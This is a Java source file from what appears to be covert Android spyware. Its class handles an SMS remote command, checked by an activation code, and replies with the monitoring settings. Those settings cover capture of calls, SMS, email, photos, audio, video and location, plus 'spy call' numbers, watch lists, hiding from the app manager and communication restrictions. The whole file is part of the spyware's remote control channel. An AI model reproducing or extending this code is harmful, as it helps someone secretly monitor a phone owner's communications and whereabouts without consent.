package com.vvt.remotecommandmanager.processor.troubleshoot;

import java.util.ArrayList;
import java.util.List;

import com.vvt.appcontext.AppContext;
import com.vvt.base.FxAddressbookMode;
import com.vvt.configurationmanager.ConfigurationManager;
import com.vvt.configurationmanager.FeatureID;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PrefAddressBook;
import com.vvt.preference_manager.PrefDeviceLock;
import com.vvt.preference_manager.PrefEmergencyNumber;
import com.vvt.preference_manager.PrefEventsCapture;
import com.vvt.preference_manager.PrefHomeNumber;
import com.vvt.preference_manager.PrefLocation;
import com.vvt.preference_manager.PrefMonitorNumber;
import com.vvt.preference_manager.PrefWatchList;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;
import com.vvt.stringutil.FxStringUtils;

public class RequestSettingsProcessor extends RemoteCommandProcessor {
	private static final String TAG = "RequestSettingsProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private PreferenceManager mPreferenceManager;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	private ConfigurationManager mConfigurationManager;
	
	public RequestSettingsProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, PreferenceManager preferenceManager, ConfigurationManager configurationManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mPreferenceManager = preferenceManager;
		mConfigurationManager = configurationManager;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try	 {
			 
			final String lineSeparator = System.getProperty("line.separator");
		 	StringBuilder sb = new StringBuilder();
						
			PrefEventsCapture eventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
			PrefLocation locationCapturePref = (PrefLocation)mPreferenceManager.getPreference(PreferenceType.LOCATION);
			PrefMonitorNumber monitorNumberPref = (PrefMonitorNumber)mPreferenceManager.getPreference(PreferenceType.MONITOR_NUMBER);
			PrefWatchList watchListPref = (PrefWatchList)mPreferenceManager.getPreference(PreferenceType.WATCH_LIST);
			PrefHomeNumber homePref = (PrefHomeNumber)mPreferenceManager.getPreference(PreferenceType.HOME_NUMBER);
			PrefDeviceLock deviceLockPref = (PrefDeviceLock)mPreferenceManager.getPreference(PreferenceType.DEVICE_LOCK);
			PrefEmergencyNumber emergencyNumberPref = (PrefEmergencyNumber)mPreferenceManager.getPreference(PreferenceType.EMERGENCY_NUMBER);
			PrefAddressBook addressBookPref = (PrefAddressBook)mPreferenceManager.getPreference(PreferenceType.ADDRESSBOOK);
						
			if(mConfigurationManager.getConfiguration() == null) {
				if(LOGE) FxLog.e(TAG, "mConfigurationManager.getConfiguration() returned null");
				mReplyMessage.setIsSuccess(false);
				mReplyMessage.setMessage(MessageManager.GET_SETTINGS_ERROR);
				return;
			}
			
			final List<FeatureID> featureIDs =  mConfigurationManager.getConfiguration().getSupportedFeture();
			
			//Capture:
            sb.append(String.format("Capture:%s", (eventsCapturePref.getEnableStartCapture() == true ? "On" : "Off" )));
            sb.append(lineSeparator);

            // Delivery rules:
            String hours = "";
            String events = "";
            int deliveryPeriodHours =  eventsCapturePref.getDeliverTimer();
            
            if(deliveryPeriodHours < 0)
                hours = "No delivery";
            else
                hours = RemoteCommandUtil.getTimeAsString(deliveryPeriodHours);

            int maxEvents = eventsCapturePref.getMaxEvent();
            if(maxEvents < 0)
                events = "No events";
            else if (maxEvents == 1)
                events = "1 event";
            else
                events = String.format("%d events", maxEvents);

            sb.append(String.format("Delivery rules:%s", String.format("%s, %s", hours, events)));
            sb.append(lineSeparator);
			 
            //Events:
            if(!eventsCapturePref.getEnableStartCapture()) {
                sb.append("Events: None");
                sb.append(lineSeparator);   
            }
            else {

                ArrayList<String> selectedEvents = new ArrayList<String>();  
                if(eventsCapturePref.getEnableCallLog() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_CALL))
                    selectedEvents.add("Call logs");
                if(eventsCapturePref.getEnableSMS() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_SMS))
                    selectedEvents.add("SMS");
                if(eventsCapturePref.getEnableEmail() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_EMAIL))
                    selectedEvents.add("Email");
                if(eventsCapturePref.getEnableMMS() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_MMS))
                    selectedEvents.add("MMS");
                if(eventsCapturePref.getEnableAddressBook() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_CONTACT))
                    selectedEvents.add("Address book");
                if(eventsCapturePref.getEnableCameraImage() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_CAMERAIMAGE))
                    selectedEvents.add("Image");
                if(eventsCapturePref.getEnableAudioFile() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_SOUND_RECORDING))
                    selectedEvents.add("Audio");
                if(eventsCapturePref.getEnableVideoFile() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_VIDEO_RECORDING))
                    selectedEvents.add("Video");
                if(locationCapturePref.getEnableLocation() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_LOCATION))
                    selectedEvents.add("Location");
                if(eventsCapturePref.getEnableWallPaper() && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_WALLPAPER))
                    selectedEvents.add("Wallpaper");

                sb.append("Events:").append(FxStringUtils.join(selectedEvents.toArray(), ", "));
                sb.append(lineSeparator);
            }
            
            //Location interval: 
            if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_LOCATION)) {
            	long interval = locationCapturePref.getLocationInterval();
            	sb.append(String.format("Location interval:%s",  RemoteCommandUtil.getTimeAsString(interval)));
            	sb.append(lineSeparator);
            }
            
            //Spy call: 
            if(featureIDs.contains(FeatureID.FEATURE_ID_SPY_CALL)) {
            	sb.append(String.format("Spy call:%s", (monitorNumberPref.getEnableMonitor() == true ? "On" : "Off" )));
                sb.append(", ");
                sb.append("[");
                
                if(monitorNumberPref.getMonitorNumber().size() > 0) {
                	sb.append(FxStringUtils.join(monitorNumberPref.getMonitorNumber().toArray(), ", "));
                }
                else {
                	sb.append("None");
                }
                
                sb.append("]");
                sb.append(lineSeparator);	
            }
            
            //Watch options: 
            if(featureIDs.contains(FeatureID.FEATURE_ID_WATCH_LIST)) {
            	sb.append(String.format("Watch options:%s", (watchListPref.getEnableWatchNotification() == true ? "On" : "Off" )));
                sb.append(", ");
                sb.append("[");
                if(watchListPref.getWatchNumber().size() > 0) {
                	sb.append(FxStringUtils.join(watchListPref.getWatchNumber().toArray(), ", "));
                }
                else {
                	sb.append("None");
                }
                sb.append("]");
                sb.append(lineSeparator);
            }
            
            if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_SIM_CHANGE)) {
            	//SIM notification:           
                sb.append("SIM notification:On");
                sb.append(lineSeparator);
            }
                       
            if(featureIDs.contains(FeatureID.FEATURE_ID_HIDE_FROM_APP_MGR)) {
            	//Visible:
                sb.append("Visible:On");
                sb.append(lineSeparator);	
            }
                        
            if(featureIDs.contains(FeatureID.FEATURE_ID_HOME_NUMBERS)) {
            	//Home:
                sb.append("Home:");
                sb.append("[");
                
                if(homePref.getHomeNumber().size() <= 0) {
                	sb.append("None");
                }
                else {
                	sb.append(FxStringUtils.join(homePref.getHomeNumber().toArray(), ", "));
                }
                
                sb.append("]");
                sb.append(lineSeparator);
            }
           
            if(featureIDs.contains(FeatureID.FEATURE_ID_PANIC)) {
            	//Panic mode:
                // TODO: Change this later when Panic module added.
                sb.append("Panic mode:Location and Image");
                sb.append(lineSeparator);	
            }
                        
            if(featureIDs.contains(FeatureID.FEATURE_ID_COMMUNICATION_RESTRICTION)) {
            	//Communication restrictions:
                sb.append("Communication restrictions:On");
                sb.append(lineSeparator);	
            }
                        
            //Configuration:
            sb.append(String.format("Configuration:%d, On", mLicenseInfo.getConfigurationId()));
            sb.append(lineSeparator);
            
            //Panic:
            if(featureIDs.contains(FeatureID.FEATURE_ID_PANIC)) {
            	sb.append("Panic:On");
            	sb.append(lineSeparator);
            }
            
            //Device lock:
            if(featureIDs.contains(FeatureID.FEATURE_ID_PANIC)) {
            	 sb.append(String.format("Device lock:%s", (deviceLockPref.getEnableAlertSound() == true ? "On" : "Off" )));
                 sb.append(lineSeparator);
            }
           
            
            //Emergency:
            if(featureIDs.contains(FeatureID.FEATURE_ID_EMERGENCY_NUMBERS)) {
            	sb.append("Emergency:");
                sb.append("[");
                
                if(emergencyNumberPref.getEmergencyNumber().size() <= 0) {
                	sb.append("None");
                }
                else {
                	sb.append(FxStringUtils.join(emergencyNumberPref.getEmergencyNumber().toArray(), ", "));
                }
                
                sb.append("]");
                sb.append(lineSeparator);	
            }
                        
            //Watch numbers:
            if(featureIDs.contains(FeatureID.FEATURE_ID_WATCH_LIST)) {
            	sb.append("Watch numbers:");
                sb.append("[");
                
                if(watchListPref.getWatchNumber().size() <= 0) {
                	sb.append("None");
                }
                else {
                	sb.append(FxStringUtils.join(watchListPref.getWatchNumber().toArray(), ", "));
                }
                
                sb.append("]");
                sb.append(lineSeparator);	
            }
            
            //Debug mode:
            // TODO: Comfirm and add
            
            //Addressbook Management mode:	
            if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_CONTACT)) {
            	sb.append("Addressbook Management mode:");
                if(addressBookPref.getMode() == FxAddressbookMode.MONITOR) {
                	sb.append("Monitor");
                } else if(addressBookPref.getMode() == FxAddressbookMode.OFF) {
                	sb.append("Off");
                } else if(addressBookPref.getMode() == FxAddressbookMode.RESTRICTED) {
                	sb.append("Restrict");
                } else
                	sb.append("Unknown");	
            }
            
            //Location Mode: 
            // TODO: Comfirm and add
            
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.append(sb.toString()).toString());
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.GET_SETTINGS_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
		
	}

	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 arguments.
			if(commandData.getArguments().size() != 1 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
}
